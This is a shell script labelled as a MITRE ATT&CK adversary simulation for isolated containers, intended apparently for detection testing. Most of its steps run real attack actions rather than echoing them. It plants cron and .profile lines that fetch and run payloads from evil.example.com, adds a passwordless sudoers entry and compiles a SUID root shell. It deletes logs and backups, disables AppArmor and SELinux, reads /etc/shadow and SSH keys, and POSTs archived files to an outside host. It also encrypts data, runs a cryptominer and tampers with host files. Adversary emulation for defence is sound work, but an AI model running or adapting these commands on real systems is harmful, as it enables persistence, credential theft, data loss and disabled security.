#!/usr/bin/env sh
# MITRE ATT&CK TTP Simulation Script - EXTENDED
# This script simulates a wide array of adversarial behaviors in a containerized environment.
#
# Requirements:
# - Run in a non-prod, isolated environment.
# - Tools like bash, nc, openssl, kubectl, git, curl, python3, nmap, masscan may be pre-installed or included in container.
#
# Customize ITERATIONS to control how many times the cycle runs.
# Default: infinite until manually stopped.
#
# Color-coded output for easier parsing:
GREEN="\033[1;32m"
BLUE="\033[1;34m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
RESET="\033[0m"

ITERATIONS="${ITERATIONS:-0}"  # 0 => infinite loop
COUNTER=0

echo -e "${BLUE}[INFO] Starting EXTENSIVE MITRE ATT&CK TTP simulation...${RESET}"

# Random sleep helper
random_sleep() {
    SECS=$((RANDOM % 5 + 2))
    sleep $SECS
}

while [ "$ITERATIONS" -eq 0 ] || [ $COUNTER -lt $ITERATIONS ]
do
    echo -e "${YELLOW}[CYCLE $COUNTER] Initiating a new, wide-ranging TTP simulation round...${RESET}"
    random_sleep

    ########################################
    # Initial Access / Execution / Discovery
    ########################################

    # T1059: Command and Scripting Interpreter (Bash)
    echo -e "${GREEN}[+] Running suspicious shell commands for initial access simulation...${RESET}"
    bash -c "echo 'Simulating attacker initial foothold via bash shell'"

    random_sleep

    # Check environment variables (T1082 System Info Discovery, T1497 Virtualization Evasion)
    echo -e "${GREEN}[+] Enumerating environment variables to discover secrets/config...${RESET}"
    env || echo -e "${RED}[!] Failed to read environment variables${RESET}"

    random_sleep

    # Attempt to detect if running in a container by checking cgroups, a known container runtime file
    echo -e "${GREEN}[+] Checking cgroups and container runtime info (Discovery)...${RESET}"
    cat /proc/1/cgroup 2>/dev/null || echo -e "${RED}[!] cgroup info not accessible${RESET}"

    random_sleep

    # T1083: File and Directory Discovery
    echo -e "${GREEN}[+] Enumerating various directories for reconnaissance...${RESET}"
    ls -lah /etc /var /home || echo -e "${RED}[!] Failed to list directories${RESET}"

    random_sleep

    # T1135: Network Share Discovery (simulate by checking mounts)
    echo -e "${GREEN}[+] Checking for mounted network shares...${RESET}"
    mount | grep nfs || echo -e "${YELLOW}[~] No NFS shares found${RESET}"

    random_sleep

    # Attempt to read K8s service account token (T1613: Container and Resource Discovery)
    echo -e "${GREEN}[+] Checking Kubernetes service account token for cluster enumeration...${RESET}"
    SA_TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"
    if [ -f "$SA_TOKEN_PATH" ]; then
        cat "$SA_TOKEN_PATH" | head -c 50 && echo "..."
    else
        echo -e "${YELLOW}[~] No service account token found${RESET}"
    fi

    random_sleep

    # K8s enumeration with kubectl if present
    if command -v kubectl >/dev/null; then
      echo -e "${GREEN}[+] Enumerating Kubernetes resources (Pods, Services)...${RESET}"
      kubectl get pods --all-namespaces || echo -e "${RED}[!] Failed to list pods${RESET}"
      kubectl get svc --all-namespaces || echo -e "${RED}[!] Failed to list services${RESET}"
    else
      echo -e "${YELLOW}[~] kubectl not found; skipping K8s enumeration${RESET}"
    fi

    random_sleep

    # Cloud Metadata Access Attempts (T1538: Cloud Service Discovery)
    # Attempt GCP/AWS Metadata query (if running in cloud)
    echo -e "${GREEN}[+] Attempting to access cloud metadata (AWS/GCP)${RESET}"
    curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo -e "${BLUE}[INFO] AWS metadata found${RESET}" || echo -e "${YELLOW}[~] No AWS metadata${RESET}"
    curl -s http://169.254.169.254/computeMetadata/v1/ -H "Metadata-Flavor: Google" 2>/dev/null && echo -e "${BLUE}[INFO] GCP metadata found${RESET}" || echo -e "${YELLOW}[~] No GCP metadata${RESET}"

    random_sleep

    # T1497: Virtualization/Sandbox Evasion: Check CPU info, memory
    echo -e "${GREEN}[+] Checking system info (CPU, Mem) for virtualization artifacts...${RESET}"
    cat /proc/cpuinfo | head -n 20
    free -m

    random_sleep

    ########################################
    # Persistence
    ########################################

    # T1053.003: Cron Job
    echo -e "${GREEN}[+] Adding malicious cron job for persistence...${RESET}"
    echo "* * * * * root curl http://evil.example.com/payload.sh | sh" >> /etc/crontabs/root

    random_sleep

    # T1547.001: Local Startup Files (.profile)
    echo -e "${GREEN}[+] Adding malicious payload to .profile (Persistence)...${RESET}"
    echo "curl http://evil.example.com/payload2.sh | sh" >> ~/.profile

    random_sleep

    # T1543.001: Create/modify systemd service (if systemd present)
    if [ -d "/etc/systemd/system" ]; then
      echo -e "${GREEN}[+] Creating a malicious systemd service for persistence...${RESET}"
      echo "[Unit]
Description=Malicious Service
[Service]
ExecStart=/bin/bash -c 'while true; do sleep 100; done'
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/malicious.service
      systemctl enable malicious.service || echo -e "${YELLOW}[~] systemctl not functional${RESET}"
    else
      echo -e "${YELLOW}[~] systemd not found; skipping systemd persistence${RESET}"
    fi

    random_sleep

    ########################################
    # Privilege Escalation
    ########################################

    echo -e "${GREEN}[+] Modifying sudoers file for Privilege Escalation...${RESET}"
    echo "eviluser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers || echo -e "${RED}[!] Could not modify sudoers${RESET}"

    random_sleep

    # Attempt SUID binary creation (T1548.001)
    echo -e "${GREEN}[+] Attempting to create a SUID binary for escalation...${RESET}"
    echo -e '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(){setuid(0);system("/bin/sh");}' > /tmp/suid.c
    gcc /tmp/suid.c -o /tmp/suid_bin && chmod u+s /tmp/suid_bin || echo -e "${RED}[!] Failed to create SUID binary${RESET}"

    random_sleep

    ########################################
    # Defense Evasion
    ########################################

    # T1070: Indicator Removal on Host (Remove logs)
    echo -e "${GREEN}[+] Removing logs to evade detection...${RESET}"
    rm -rf /var/log/* /var/tmp/* || echo -e "${RED}[!] Failed to remove logs${RESET}"

    random_sleep

    # Attempt to disable AppArmor/SELinux if present (T1562.001)
    if command -v aa-status >/dev/null; then
        echo -e "${GREEN}[+] Attempting to disable AppArmor profiles (Defense Evasion)...${RESET}"
        aa-teardown || echo -e "${YELLOW}[~] Could not teardown AppArmor${RESET}"
    fi

    if command -v setenforce >/dev/null; then
        echo -e "${GREEN}[+] Attempting to set SELinux to permissive mode...${RESET}"
        setenforce 0 || echo -e "${YELLOW}[~] SELinux not enforced${RESET}"
    fi

    random_sleep

    # T1564.003: Hide Artifacts in shell config
    echo -e "${GREEN}[+] Adding alias to hide 'ls' output in .bashrc${RESET}"
    echo "alias ls='echo Nothing to see here'" >> ~/.bashrc

    random_sleep

    ########################################
    # Credential Access
    ########################################

    # T1003: Dump /etc/shadow
    echo -e "${GREEN}[+] Attempting to dump credentials (/etc/shadow)...${RESET}"
    cat /etc/shadow || echo -e "${RED}[!] Failed to read /etc/shadow${RESET}"

    random_sleep

    # T1552.001: Search for credentials in bash history
    echo -e "${GREEN}[+] Searching bash history for stored credentials...${RESET}"
    grep -i password ~/.bash_history || echo -e "${YELLOW}[~] No passwords found in bash_history${RESET}"

    random_sleep

    # Check for SSH keys
    echo -e "${GREEN}[+] Reading SSH private keys (credential theft)...${RESET}"
    cat ~/.ssh/id_rsa 2>/dev/null || echo -e "${YELLOW}[~] No SSH keys found${RESET}"

    random_sleep

    # Brute Force simulation (T1110) - Just simulate by echoing attempts
    echo -e "${GREEN}[+] Simulating brute force attempts against a local service...${RESET}"
    for i in $(seq 1 3); do
        echo "Attempt $i: Trying password guess"
        sleep 1
    done

    random_sleep

    ########################################
    # Lateral Movement
    ########################################

    # T1021: SSH to another host (simulated)
    echo -e "${GREEN}[+] Attempting lateral movement via SSH to target-machine...${RESET}"
    ssh -oStrictHostKeyChecking=no user@target-machine "whoami" || echo -e "${RED}[!] SSH lateral movement failed${RESET}"

    random_sleep

    # T1046: Network Service Scanning with nmap
    if command -v nmap >/dev/null; then
      echo -e "${GREEN}[+] Scanning internal network with nmap...${RESET}"
      nmap -p1-100 10.0.0.0/24 || echo -e "${RED}[!] Nmap scan failed${RESET}"
    else
      echo -e "${YELLOW}[~] nmap not found; skipping network scanning${RESET}"
    fi

    random_sleep

    # Attempt masscan if installed
    if command -v masscan >/dev/null; then
      echo -e "${GREEN}[+] Running masscan on internal range...${RESET}"
      masscan 10.0.0.0/24 -p80 --rate=1000 || echo -e "${RED}[!] masscan failed${RESET}"
    fi

    random_sleep

    ########################################
    # Collection & Exfiltration
    ########################################

    # T1005: Data from Local System
    echo -e "${GREEN}[+] Collecting sensitive files (e.g., /etc/passwd, /etc/hosts)...${RESET}"
    tar -czvf collected_data_$COUNTER.tar.gz /etc/passwd /etc/hosts /home 2>/dev/null

    random_sleep

    # T1048: Exfiltration Over Alternative Protocol (DNS, HTTP)
    echo -e "${GREEN}[+] Simulating exfiltration over DNS (lookup random subdomains)...${RESET}"
    host secretdata$(date +%s).evil.example.com || echo -e "${YELLOW}[~] DNS exfil simulation complete${RESET}"

    random_sleep

    # T1567: Exfiltration Over Web Service (POST data via curl)
    echo -e "${GREEN}[+] Simulating exfiltration via HTTP POST to external server...${RESET}"
    curl -X POST -F "file=@collected_data_$COUNTER.tar.gz" http://evil.example.com/upload || echo -e "${RED}[!] HTTP exfiltration failed${RESET}"

    random_sleep

    ########################################
    # Impact
    ########################################

    # T1486: Data Encrypted for Impact
    echo -e "${GREEN}[+] Simulating ransomware encryption of /important_dir...${RESET}"
    tar -cf sensitive_data_$COUNTER.tar /important_dir 2>/dev/null
    openssl enc -aes-256-cbc -salt -in sensitive_data_$COUNTER.tar -out sensitive_data_$COUNTER.enc -k supersecret

    random_sleep

    # T1490: Inhibit System Recovery (remove backups if any)
    echo -e "${GREEN}[+] Removing backup files to prevent recovery...${RESET}"
    rm -rf /backup/* 2>/dev/null || echo -e "${YELLOW}[~] No backup directory found${RESET}"

    random_sleep

    # Resource Hijacking (T1496): Simulate crypto miner execution if xmrig or similar is available
    if command -v xmrig >/dev/null; then
      echo -e "${GREEN}[+] Running cryptominer to hijack resources...${RESET}"
      xmrig --url=stratum+tcp://xmrpool.example.com:3333 --user=evilhacker || echo -e "${RED}[!] Crypto miner failed${RESET}"
    else
      echo -e "${YELLOW}[~] xmrig not found; skipping crypto mining simulation${RESET}"
    fi

    random_sleep

    # T1489: System Shutdown/Reboot (simulated by echoing, actual shutdown commented out)
    echo -e "${GREEN}[+] Attempting system shutdown (simulated)${RESET}"
    #shutdown -h now || echo -e "${RED}[!] Shutdown failed${RESET}"
    echo -e "${YELLOW}[~] Skipping actual shutdown to preserve environment${RESET}"

    random_sleep

    # Attempt container escape scenario: if /host is mounted, try writing to host etc
    echo -e "${GREEN}[+] Attempting container breakout via host filesystem if mounted...${RESET}"
    if [ -d "/host" ]; then
        echo "MALICIOUS ENTRY" >> /host/etc/hosts && echo -e "${BLUE}[INFO] Successfully tampered with host file (simulation)${RESET}"
    else
        echo -e "${YELLOW}[~] No host mount found; cannot simulate breakout${RESET}"
    fi

    random_sleep

    # Increment cycle count
    COUNTER=$((COUNTER+1))
    [ "$ITERATIONS" -ne 0 ] && [ $COUNTER -ge $ITERATIONS ] && break

    # Sleep before next round
    SLEEP_BETWEEN=$((RANDOM % 20 + 10))
    echo -e "${BLUE}[INFO] Waiting ${SLEEP_BETWEEN}s before next simulation cycle...${RESET}"
    sleep $SLEEP_BETWEEN
done

echo -e "${BLUE}[INFO] Completed all simulation cycles. MITRE ATT&CK simulation ended.${RESET}"